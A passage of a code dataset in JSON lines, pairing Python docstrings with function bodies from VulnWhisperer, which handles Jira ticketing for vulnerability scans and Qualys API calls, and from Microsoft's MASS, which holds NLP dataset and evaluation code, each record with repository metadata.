"apache-2.0", "language": "python", "size": 2557}
{"docstring": "'''\nThis function compares a vulnerability with a collection of tickets.\nReturns [exists (bool), is equal (bool), ticketid (str), assets (array)]\n'''\n# we need to return if the vulnerability has already been reported and the ID of the ticket for further processing\n#function returns array [duplicated(bool), update(bool), ticketid, ticket_assets]\n", "func_signal": "def check_vuln_already_exists(self, vuln):\n", "code": "title = vuln['title']\nlabels = [vuln['source'], vuln['scan_name'], 'vulnerability_management', 'vulnerability'] \n#list(set()) to remove duplicates\nassets = list(set(re.findall(r\"\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b\", \",\".join(vuln['ips']))))\n\nif not self.all_tickets:\n    self.logger.info(\"Retrieving all JIRA tickets with the following tags {}\".format(labels))\n    # we want to check all JIRA tickets, to include tickets moved to other queues\n    # will exclude tickets older than 12 months, old tickets will get closed for higiene and recreated if still vulnerable\n    jql = \"{} AND NOT labels=advisory AND created >=startOfMonth(-{})\".format(\" AND \".join([\"labels={}\".format(label) for label in labels]), self.max_time_tracking)\n    \n    self.all_tickets = self.jira.search_issues(jql, maxResults=0)\n\n#WARNING: function IGNORES DUPLICATES, after finding a \"duplicate\" will just return it exists\n#it wont iterate over the rest of tickets looking for other possible duplicates/similar issues\nself.logger.info(\"Comparing Vulnerabilities to created tickets\")\nfor index in range(len(self.all_tickets)):\n    checking_ticketid, checking_title, checking_assets = self.ticket_get_unique_fields(self.all_tickets[index])\n    # added \"not risk_accepted\", as if it is risk_accepted, we will create a new ticket excluding the accepted assets\n    if title.encode('ascii') == checking_title.encode('ascii') and not self.is_risk_accepted(self.jira.issue(checking_ticketid)): \n        difference = list(set(assets).symmetric_difference(checking_assets))\n        #to check intersection - set(assets) & set(checking_assets)\n        if difference: \n            self.logger.info(\"Asset mismatch, ticket to update. Ticket ID: {}\".format(checking_ticketid))\n            return False, True, checking_ticketid, checking_assets #this will automatically validate\n        else:\n            self.logger.info(\"Confirmed duplicated. TickedID: {}\".format(checking_ticketid))\n            return True, False, checking_ticketid, [] #this will automatically validate\nreturn False, False, \"\", []", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "# function returns an array with [jira_project, jira_components, datafile_path]\n\n#Jira variables\n", "func_signal": "def get_env_variables(self, source, scan_name):\n", "code": "jira_section = self.config.normalize_section(\"{}.{}\".format(source,scan_name))\n\nproject = self.config.get(jira_section,'jira_project')\nif project == \"\":\n    self.logger.error('JIRA project is missing on the configuration file!')\n    sys.exit(0)\n\n# check that project actually exists\nif not self.jira.project_exists(project):\n    self.logger.error(\"JIRA project '{project}' doesn't exist!\".format(project=project))\n    sys.exit(0)\n\ncomponents = self.config.get(jira_section,'components').split(',')\n\n#cleaning empty array from ''\nif not components[0]:\n    components = []\n\nmin_critical = self.config.get(jira_section,'min_critical_to_report')\nif not min_critical:\n    self.logger.error('\"min_critical_to_report\" variable on config file is empty.')\n    sys.exit(0)\n\n#datafile path\nfilename, reported = self.get_latest_results(source, scan_name)\nfullpath = \"\"\n\n# search data files under user specified directory\nfor root, dirnames, filenames in os.walk(vwConfig(self.config_path).get(source,'write_path')):\n    if filename in filenames:\n        fullpath = \"{}/{}\".format(root,filename)\n\nif reported:\n    self.logger.warn('Last Scan of \"{scan_name}\" for source \"{source}\" has already been reported; will be skipped.'.format(scan_name=scan_name, source=source))\n    return [False] * 5\n\nif not fullpath:\n    self.logger.error('Scan of \"{scan_name}\" for source \"{source}\" has not been found. Please check that the scanner data files are in place.'.format(scan_name=scan_name, source=source))\n    sys.exit(1)\n\ndns_resolv = self.config.get('jira','dns_resolv')\nif dns_resolv in ('False', 'false', ''):\n    dns_resolv = False\nelif dns_resolv in ('True', 'true'):\n    dns_resolv = True\nelse:\n    self.logger.error(\"dns_resolv variable not setup in [jira] section; will not do dns resolution\")\n    dns_resolv = False\n\nreturn project, components, fullpath, min_critical, dns_resolv", "path": "VulnWhisperer/vulnwhisp/vulnwhisp.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "\"\"\"\nChecks number of scans, used to control the api limits\n\"\"\"\n", "func_signal": "def get_was_scan_count(self, status):\n", "code": "parameters = (\n    E.ServiceRequest(\n        E.filters(\n            E.Criteria({'field': 'status', 'operator': 'EQUALS'}, status))))\nxml_output = self.qgc.request(self.COUNT_WASSCAN, parameters)\nroot = objectify.fromstring(xml_output.encode('utf-8'))\nreturn root.count.text", "path": "VulnWhisperer/vulnwhisp/frameworks/qualys_web.py", "commit_date": "2019-05-02 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "# we want to check JIRA tickets with risk_accepted/server_decommission or false_positive labels sharing the same source\n# will exclude tickets older than 12 months, old tickets will get closed for higiene and recreated if still vulnerable\n", "func_signal": "def exclude_accepted_assets(self, vuln):\n", "code": "labels = [vuln['source'], vuln['scan_name'], 'vulnerability_management', 'vulnerability'] \n\nif not self.excluded_tickets:\n    jql = \"{} AND labels in (risk_accepted,server_decommission, false_positive) AND NOT labels=advisory AND created >=startOfMonth(-{})\".format(\" AND \".join([\"labels={}\".format(label) for label in labels]), self.max_time_tracking)\n    self.excluded_tickets = self.jira.search_issues(jql, maxResults=0)\n\ntitle = vuln['title']\n#WARNING: function IGNORES DUPLICATES, after finding a \"duplicate\" will just return it exists\n#it wont iterate over the rest of tickets looking for other possible duplicates/similar issues\nself.logger.info(\"Comparing vulnerability to risk_accepted tickets\")\nassets_to_exclude = []\ntickets_excluded_assets = []\nfor index in range(len(self.excluded_tickets)):\n    checking_ticketid, checking_title, checking_assets = self.ticket_get_unique_fields(self.excluded_tickets[index])\n    if title.encode('ascii') == checking_title.encode('ascii'):\n        if checking_assets:\n            #checking_assets is a list, we add to our full list for later delete all assets\n            assets_to_exclude+=checking_assets\n            tickets_excluded_assets.append(checking_ticketid)\n       \nif assets_to_exclude:\n    assets_to_remove = []\n    self.logger.warn(\"Vulnerable Assets seen on an already existing risk_accepted Jira ticket: {}\".format(', '.join(tickets_excluded_assets)))\n    self.logger.debug(\"Original assets: {}\".format(vuln['ips']))\n    #assets in vulnerability have the structure \"ip - hostname - port\", so we need to match by partial \n    for exclusion in assets_to_exclude:\n        # for efficiency, we walk the backwards the array of ips from the scanners, as we will be popping out the matches \n        # and we don't want it to affect the rest of the processing (otherwise, it would miss the asset right after the removed one)\n        for index in range(len(vuln['ips']))[::-1]:\n            if exclusion == vuln['ips'][index].split(\" - \")[0]:\n                self.logger.debug(\"Deleting asset {} from vulnerability {}, seen in risk_accepted.\".format(vuln['ips'][index], title))\n                vuln['ips'].pop(index)\n    self.logger.debug(\"Modified assets: {}\".format(vuln['ips']))\n\nreturn vuln", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "# this will close a ticket by ticketid\n", "func_signal": "def close_ticket(self, ticketid, resolution, comment):\n", "code": "self.logger.debug(\"Ticket {} exists, CLOSE requested\".format(ticketid))\nticket_obj = self.jira.issue(ticketid)\nif not self.is_ticket_resolved(ticket_obj):\n    try:\n        if self.is_ticket_closeable(ticket_obj):\n            #need to add the label before closing the ticket\n            self.add_label(ticketid, 'closed')\n            error = self.jira.transition_issue(issue=ticketid, transition=self.JIRA_CLOSE_ISSUE, comment = comment, resolution = {\"name\": resolution })\n            self.logger.info(\"Ticket {} closed successfully\".format(ticketid))\n            return 1\n    except Exception as e:\n        # continue with ticket data so that a new ticket is created in place of the \"lost\" one\n        self.logger.error(\"error closing ticket {}: {}\".format(ticketid, e))\n        return 0\n        \nreturn 0", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "'''\ndeletes the server_decomission tag from those tickets that have been \nclosed already for more than x months (default is 3 months) in order to clean solved issues\nfor statistics purposes\n'''\n", "func_signal": "def decommission_cleanup(self):\n", "code": "self.logger.info(\"Deleting 'server_decommission' tag from tickets closed more than {} months ago\".format(self.max_decommission_time))\n\njql = \"labels=vulnerability_management AND labels=server_decommission and resolutiondate <=startOfMonth(-{})\".format(self.max_decommission_time)\ndecommissioned_tickets = self.jira.search_issues(jql, maxResults=0)\n\ncomment = '''This ticket is having deleted the *server_decommission* tag, as it is more than {} months old and is expected to already have been decommissioned.\nIf that is not the case and the vulnerability still exists, the vulnerability will be opened again.'''.format(self.max_decommission_time)\n\nfor ticket in decommissioned_tickets:\n    #we open first the ticket, as we want to make sure the process is not blocked due to \n    #an unexisting jira workflow or unallowed edit from closed tickets\n    self.reopen_ticket(ticketid=ticket, ignore_labels=True)\n    self.remove_label(ticket, 'server_decommission')\n    self.close_ticket(ticket, self.JIRA_RESOLUTION_FIXED, comment)\n\nreturn 0", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "# Get the assets as a string \"host - protocol/port - hostname\" separated by \"\\n\"\n# structure the text to have the same structure as the assets from the attachment\n", "func_signal": "def get_assets_from_description(self, ticket, _raw = False):\n", "code": "affected_assets = \"\"\ntry:\n    affected_assets = ticket.raw.get('fields', {}).get('description').encode(\"ascii\").split(\"{panel:title=Affected Assets}\")[1].split(\"{panel}\")[0].replace('\\n','').replace(' * ','\\n').replace('\\n', '', 1)\nexcept Exception as e:\n    self.logger.error(\"Unable to process the Ticket's 'Affected Assets'. Ticket ID: {}. Reason: {}\".format(ticket, e))\n\nif affected_assets:\n    if _raw:\n        # from line 406 check if the text in the panel corresponds to having added an attachment\n        if \"added as an attachment\" in affected_assets:\n            return False\n        return affected_assets\n\n    try:\n        # if _raw is not true, we return only the IPs of the affected assets\n        return list(set(re.findall(r\"\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b\", affected_assets)))\n    except Exception as e:\n        self.logger.error(\"Ticket IPs regex failed. Ticket ID: {}. Reason: {}\".format(ticket, e))\nreturn False", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "\"\"\"\nRetrieves UUIDs from database and checks list to determine which files need to be processed.\n:return:\n\"\"\"\n", "func_signal": "def retrieve_uuids(self):\n", "code": "try:\n    self.conn.text_factory = str\n    self.cur.execute('SELECT uuid FROM scan_history where source = \"{config_section}\"'.format(config_section=self.CONFIG_SECTION))\n    results = frozenset([r[0] for r in self.cur.fetchall()])\nexcept:\n    results = []\nreturn results", "path": "VulnWhisperer/vulnwhisp/vulnwhisp.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "\"\"\" Returns XML of ALL WAS Scans\"\"\"\n", "func_signal": "def get_scan_info(self, limit=1000, offset=1, status='FINISHED'):\n", "code": "data = self.generate_scan_result_XML(limit=limit, offset=offset, status=status)\nreturn self.qgc.request(self.SEARCH_WAS_SCAN, data)", "path": "VulnWhisperer/vulnwhisp/frameworks/qualys_web.py", "commit_date": "2019-05-02 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "# Close tickets older than 12 months, vulnerabilities not solved will get created a new ticket \n", "func_signal": "def close_obsolete_tickets(self):\n", "code": "self.logger.info(\"Closing obsolete tickets older than {} months\".format(self.max_time_tracking))\njql = \"labels=vulnerability_management AND NOT labels=advisory AND created <startOfMonth(-{}) and resolution=Unresolved\".format(self.max_time_tracking)\ntickets_to_close = self.jira.search_issues(jql, maxResults=0)\n\ncomment = '''This ticket is being closed for hygiene, as it is more than {} months old.\nIf the vulnerability still exists, a new ticket will be opened.'''.format(self.max_time_tracking)\n\nfor ticket in tickets_to_close:\n        self.close_ticket(ticket, self.JIRA_RESOLUTION_OBSOLETE, comment)\n\nreturn 0", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "#get time a ticket took to be resolved\n", "func_signal": "def get_resolution_time(self, ticket):\n", "code": "ticket_obj = self.jira.issue(ticket)\nif self.is_ticket_resolved(ticket_obj):\n    ticket_data = ticket_obj.raw.get('fields')\n    #dates follow format '2018-11-06T10:36:13.849+0100'\n    created = [int(x) for x in ticket_data['created'].split('.')[0].replace('T', '-').replace(':','-').split('-')]\n    resolved =[int(x) for x in ticket_data['resolutiondate'].split('.')[0].replace('T', '-').replace(':','-').split('-')]\n    \n    start = datetime(created[0],created[1],created[2],created[3],created[4],created[5])\n    end = datetime(resolved[0],resolved[1],resolved[2],resolved[3],resolved[4],resolved[5])\n    return (end-start).days\nelse:\n    self.logger.error(\"Ticket {ticket} is not resolved, can't calculate resolution time\".format(ticket=ticket))\n\nreturn False", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "#for backwards compatibility with older versions without \"reported\" field\n\n", "func_signal": "def record_insert(self, record):\n", "code": "try:\n    #-1 to get the latest column, 1 to get the column name (old version would be \"processed\", new \"reported\")\n    #TODO delete backward compatibility check after some versions\n    last_column_table = self.cur.execute('PRAGMA table_info(scan_history)').fetchall()[-1][1]\n    if last_column_table == self.table_columns[-1]:\n        self.cur.execute('insert into scan_history({table_columns}) values (?,?,?,?,?,?,?,?,?,?)'.format(\n            table_columns=', '.join(self.table_columns)), record)\n\n    else:\n        self.cur.execute('insert into scan_history({table_columns}) values (?,?,?,?,?,?,?,?,?)'.format(\n            table_columns=', '.join(self.table_columns[:-1])), record[:-1])\n    self.conn.commit()\nexcept Exception as e:\n    self.logger.error(\"Failed to insert record in database. Error: {}\".format(e))\n    sys.exit(1)", "path": "VulnWhisperer/vulnwhisp/vulnwhisp.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "#Checks if a ticket is resolved or not\n", "func_signal": "def is_ticket_resolved(self, ticket_obj):\n", "code": "if ticket_obj is not None:\n    if ticket_obj.raw['fields'].get('resolution') is not None:\n        if ticket_obj.raw['fields'].get('resolution').get('name') != 'Unresolved':\n            self.logger.debug(\"Checked ticket {} is already closed\".format(ticket_obj))\n            self.logger.info(\"Ticket {} is closed\".format(ticket_obj))\n            return True\nself.logger.debug(\"Checked ticket {} is already open\".format(ticket_obj))\nreturn False", "path": "VulnWhisperer/vulnwhisp/reporting/jira_api.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "HASecuritySolutions/VulnWhisperer", "stars": 1331, "license": "apache-2.0", "language": "python", "size": 2557}
{"docstring": "\"\"\"\nEncode a set of lines. All lines will be encoded together.\n\"\"\"\n", "func_signal": "def encode_lines(self, lines):\n", "code": "enc_lines = []\nfor line in lines:\n    line = line.strip()\n    if len(line) == 0 and not self.args.keep_empty:\n        return [\"EMPTY\", None]\n    tokens = self.encode(line)\n    enc_lines.append(\" \".join(tokens))\nreturn [\"PASS\", enc_lines]", "path": "MASS/MASS-summarization/encode.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nInitialize evaluator.\n\"\"\"\n", "func_signal": "def __init__(self, trainer, data, params):\n", "code": "self.trainer = trainer\nself.data = data\nself.dico = data['dico']\nself.params = params\n\n# create directory to store hypotheses, and reference files for BLEU evaluation\nif self.params.is_master:\n    params.hyp_path = os.path.join(params.dump_path, 'hypotheses')\n    subprocess.Popen('mkdir -p %s' % params.hyp_path, shell=True).wait()\n    self.create_reference_files()", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nReturn a sentences iterator, given the associated sentence batches.\n\"\"\"\n", "func_signal": "def get_batches_iterator(self, batches, return_indices):\n", "code": "assert type(return_indices) is bool\n\nfor sentence_ids in batches:\n    if 0 < self.max_batch_size < len(sentence_ids):\n        np.random.shuffle(sentence_ids)\n        sentence_ids = sentence_ids[:self.max_batch_size]\n    pos1 = self.pos1[sentence_ids]\n    pos2 = self.pos2[sentence_ids]\n    sent1 = self.batch_sentences([self.sent1[a:b] for a, b in pos1])\n    sent2 = self.batch_sentences([self.sent2[a:b] for a, b in pos2])\n    yield (sent1, sent2, sentence_ids) if return_indices else (sent1, sent2)", "path": "MASS/MASS-unsupNMT/src/data/dataset.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nCreate a new iterator for a dataset.\n\"\"\"\n", "func_signal": "def get_iterator(self, data_set, lang1, lang2=None, stream=False):\n", "code": "assert data_set in ['valid', 'test']\nassert lang1 in self.params.langs\nassert lang2 is None or lang2 in self.params.langs\nassert stream is False or lang2 is None\n\n# hacks to reduce evaluation time when using many languages\nif len(self.params.langs) > 30:\n    eval_lgs = set([\"ar\", \"bg\", \"de\", \"el\", \"en\", \"es\", \"fr\", \"hi\", \"ru\", \"sw\", \"th\", \"tr\", \"ur\", \"vi\", \"zh\", \"ab\", \"ay\", \"bug\", \"ha\", \"ko\", \"ln\", \"min\", \"nds\", \"pap\", \"pt\", \"tg\", \"to\", \"udm\", \"uk\", \"zh_classical\"])\n    eval_lgs = set([\"ar\", \"bg\", \"de\", \"el\", \"en\", \"es\", \"fr\", \"hi\", \"ru\", \"sw\", \"th\", \"tr\", \"ur\", \"vi\", \"zh\"])\n    subsample = 10 if (data_set == 'test' or lang1 not in eval_lgs) else 5\n    n_sentences = 600 if (data_set == 'test' or lang1 not in eval_lgs) else 1500\nelif len(self.params.langs) > 5:\n    subsample = 10 if data_set == 'test' else 5\n    n_sentences = 300 if data_set == 'test' else 1500\nelse:\n    # n_sentences = -1 if data_set == 'valid' else 100\n    n_sentences = -1\n    subsample = 1\n\n\nif lang2 is None:\n    if self.params.english_only is True:\n        n_sentences = 300\n    if stream:\n        iterator = self.data['mono_stream'][lang1][data_set].get_iterator(shuffle=False, subsample=subsample)\n    else:\n        iterator = self.data['mono'][lang1][data_set].get_iterator(\n            shuffle=False,\n            group_by_size=True,\n            n_sentences=n_sentences,\n        )\nelse:\n    assert stream is False\n    _lang1, _lang2 = (lang1, lang2) if lang1 < lang2 else (lang2, lang1)\n    iterator = self.data['para'][(_lang1, _lang2)][data_set].get_iterator(\n        shuffle=False,\n        group_by_size=True,\n        n_sentences=n_sentences\n    )\n\nfor batch in iterator:\n    yield batch if lang2 is None or lang1 < lang2 else batch[::-1]", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nSanity checks.\n\"\"\"\n", "func_signal": "def check(self):\n", "code": "eos = self.eos_index\nassert len(self.pos1) == len(self.pos2) > 0                          # check number of sentences\nassert len(self.pos1) == (self.sent1[self.pos1[:, 1]] == eos).sum()  # check sentences indices\nassert len(self.pos2) == (self.sent2[self.pos2[:, 1]] == eos).sum()  # check sentences indices\nassert eos <= self.sent1.min() < self.sent1.max()                    # check dictionary indices\nassert eos <= self.sent2.min() < self.sent2.max()                    # check dictionary indices\nassert self.lengths1.min() > 0                                       # check empty sentences\nassert self.lengths2.min() > 0                                       # check empty sentences", "path": "MASS/MASS-unsupNMT/src/data/dataset.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nRemove empty sentences.\n\"\"\"\n", "func_signal": "def remove_empty_sentences(self):\n", "code": "init_size = len(self.pos)\nindices = np.arange(len(self.pos))\nindices = indices[self.lengths[indices] > 0]\nself.pos = self.pos[indices]\nself.lengths = self.pos[:, 1] - self.pos[:, 0]\nlogger.info(\"Removed %i empty sentences.\" % (init_size - len(indices)))\nself.check()", "path": "MASS/MASS-unsupNMT/src/data/dataset.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nBuild language model evaluator.\n\"\"\"\n", "func_signal": "def __init__(self, trainer, data, params):\n", "code": "super().__init__(trainer, data, params)\nself.model = trainer.model", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nSanity checks.\n\"\"\"\n", "func_signal": "def check(self):\n", "code": "eos = self.eos_index\nassert len(self.pos) == (self.sent[self.pos[:, 1]] == eos).sum()  # check sentences indices\n# assert self.lengths.min() > 0                                     # check empty sentences", "path": "MASS/MASS-unsupNMT/src/data/dataset.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nTake as input a list of n sentences (torch.LongTensor vectors) and return\na tensor of size (slen, n) where slen is the length of the longest\nsentence, and a vector lengths containing the length of each sentence.\n\"\"\"\n# sentences = sorted(sentences, key=lambda x: len(x), reverse=True)\n", "func_signal": "def batch_sentences(self, sentences):\n", "code": "lengths = torch.LongTensor([len(s) + 2 for s in sentences])\nsent = torch.LongTensor(lengths.max().item(), lengths.size(0)).fill_(self.pad_index)\n\nsent[0] = self.eos_index\nfor i, s in enumerate(sentences):\n    if lengths[i] > 2:  # if sentence not empty\n        sent[1:lengths[i] - 1, i].copy_(torch.from_numpy(s.astype(np.int64)))\n    sent[lengths[i] - 1, i] = self.eos_index\n\nreturn sent, lengths", "path": "MASS/MASS-unsupNMT/src/data/dataset.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nEvaluate perplexity and next word prediction accuracy.\n\"\"\"\n", "func_signal": "def evaluate_mlm(self, scores, data_set, lang1, lang2):\n", "code": "params = self.params\nassert data_set in ['valid', 'test']\nassert lang1 in params.langs\nassert lang2 in params.langs or lang2 is None\n\nmodel = self.model if params.encoder_only else self.encoder\nmodel.eval()\nmodel = model.module if params.multi_gpu else model\n\nrng = np.random.RandomState(0)\n\nlang1_id = params.lang2id[lang1]\nlang2_id = params.lang2id[lang2] if lang2 is not None else None\n\nn_words = 0\nxe_loss = 0\nn_valid = 0\n\nfor batch in self.get_iterator(data_set, lang1, lang2, stream=(lang2 is None)):\n\n    # batch\n    if lang2 is None:\n        x, lengths = batch\n        positions = None\n        langs = x.clone().fill_(lang1_id) if params.n_langs > 1 else None\n    else:\n        (sent1, len1), (sent2, len2) = batch\n        x, lengths, positions, langs = concat_batches(sent1, len1, lang1_id, sent2, len2, lang2_id, params.pad_index, params.eos_index, reset_positions=True)\n\n    # words to predict\n    x, y, pred_mask = self.mask_out(x, lengths, rng)\n\n    # cuda\n    x, y, pred_mask, lengths, positions, langs = to_cuda(x, y, pred_mask, lengths, positions, langs)\n\n    # forward / loss\n    tensor = model('fwd', x=x, lengths=lengths, positions=positions, langs=langs, causal=False)\n    word_scores, loss = model('predict', tensor=tensor, pred_mask=pred_mask, y=y, get_scores=True)\n\n    # update stats\n    n_words += len(y)\n    xe_loss += loss.item() * len(y)\n    n_valid += (word_scores.max(1)[1] == y).sum().item()\n\n# compute perplexity and prediction accuracy\nppl_name = '%s_%s_mlm_ppl' % (data_set, lang1) if lang2 is None else '%s_%s-%s_mlm_ppl' % (data_set, lang1, lang2)\nacc_name = '%s_%s_mlm_acc' % (data_set, lang1) if lang2 is None else '%s_%s-%s_mlm_acc' % (data_set, lang1, lang2)\nscores[ppl_name] = np.exp(xe_loss / n_words) if n_words > 0 else 1e9\nscores[acc_name] = 100. * n_valid / n_words if n_words > 0 else 0.", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nCreate reference files for BLEU evaluation.\n\"\"\"\n", "func_signal": "def create_reference_files(self):\n", "code": "params = self.params\nparams.ref_paths = {}\n\nfor (lang1, lang2), v in self.data['para'].items():\n\n    assert lang1 < lang2\n\n    for data_set in ['valid', 'test']:\n\n        # define data paths\n        lang1_path = os.path.join(params.hyp_path, 'ref.{0}-{1}.{2}.txt'.format(lang2, lang1, data_set))\n        lang2_path = os.path.join(params.hyp_path, 'ref.{0}-{1}.{2}.txt'.format(lang1, lang2, data_set))\n\n        # store data paths\n        params.ref_paths[(lang2, lang1, data_set)] = lang1_path\n        params.ref_paths[(lang1, lang2, data_set)] = lang2_path\n\n        # text sentences\n        lang1_txt = []\n        lang2_txt = []\n\n        # convert to text\n        for (sent1, len1), (sent2, len2) in self.get_iterator(data_set, lang1, lang2):\n            lang1_txt.extend(convert_to_text(sent1, len1, self.dico, params))\n            lang2_txt.extend(convert_to_text(sent2, len2, self.dico, params))\n\n        # replace <unk> by <<unk>> as these tokens cannot be counted in BLEU\n        lang1_txt = [x.replace('<unk>', '<<unk>>') for x in lang1_txt]\n        lang2_txt = [x.replace('<unk>', '<<unk>>') for x in lang2_txt]\n\n        # export hypothesis\n        with open(lang1_path, 'w', encoding='utf-8') as f:\n            f.write('\\n'.join(lang1_txt) + '\\n')\n        with open(lang2_path, 'w', encoding='utf-8') as f:\n            f.write('\\n'.join(lang2_txt) + '\\n')\n\n        # restore original segmentation\n        restore_segmentation(lang1_path)\n        restore_segmentation(lang2_path)", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
{"docstring": "\"\"\"\nEvaluate perplexity and next word prediction accuracy.\n\"\"\"\n", "func_signal": "def evaluate_clm(self, scores, data_set, lang1, lang2):\n", "code": "params = self.params\nassert data_set in ['valid', 'test']\nassert lang1 in params.langs\nassert lang2 in params.langs or lang2 is None\n\nmodel = self.model if params.encoder_only else self.decoder\nmodel.eval()\nmodel = model.module if params.multi_gpu else model\n\nlang1_id = params.lang2id[lang1]\nlang2_id = params.lang2id[lang2] if lang2 is not None else None\n\nn_words = 0\nxe_loss = 0\nn_valid = 0\n\nfor batch in self.get_iterator(data_set, lang1, lang2, stream=(lang2 is None)):\n\n    # batch\n    if lang2 is None:\n        x, lengths = batch\n        positions = None\n        langs = x.clone().fill_(lang1_id) if params.n_langs > 1 else None\n    else:\n        (sent1, len1), (sent2, len2) = batch\n        x, lengths, positions, langs = concat_batches(sent1, len1, lang1_id, sent2, len2, lang2_id, params.pad_index, params.eos_index, reset_positions=True)\n\n    # words to predict\n    alen = torch.arange(lengths.max(), dtype=torch.long, device=lengths.device)\n    pred_mask = alen[:, None] < lengths[None] - 1\n    y = x[1:].masked_select(pred_mask[:-1])\n    assert pred_mask.sum().item() == y.size(0)\n\n    # cuda\n    x, lengths, positions, langs, pred_mask, y = to_cuda(x, lengths, positions, langs, pred_mask, y)\n\n    # forward / loss\n    tensor = model('fwd', x=x, lengths=lengths, positions=positions, langs=langs, causal=True)\n    word_scores, loss = model('predict', tensor=tensor, pred_mask=pred_mask, y=y, get_scores=True)\n\n    # update stats\n    n_words += y.size(0)\n    xe_loss += loss.item() * len(y)\n    n_valid += (word_scores.max(1)[1] == y).sum().item()\n\n# compute perplexity and prediction accuracy\nppl_name = '%s_%s_clm_ppl' % (data_set, lang1) if lang2 is None else '%s_%s-%s_clm_ppl' % (data_set, lang1, lang2)\nacc_name = '%s_%s_clm_acc' % (data_set, lang1) if lang2 is None else '%s_%s-%s_clm_acc' % (data_set, lang1, lang2)\nscores[ppl_name] = np.exp(xe_loss / n_words)\nscores[acc_name] = 100. * n_valid / n_words", "path": "MASS/MASS-unsupNMT/src/evaluation/evaluator.py", "commit_date": "2019-09-27 00:00:00", "repo_name": "microsoft/MASS", "stars": 1112, "license": "other", "language": "python", "size": 3044}
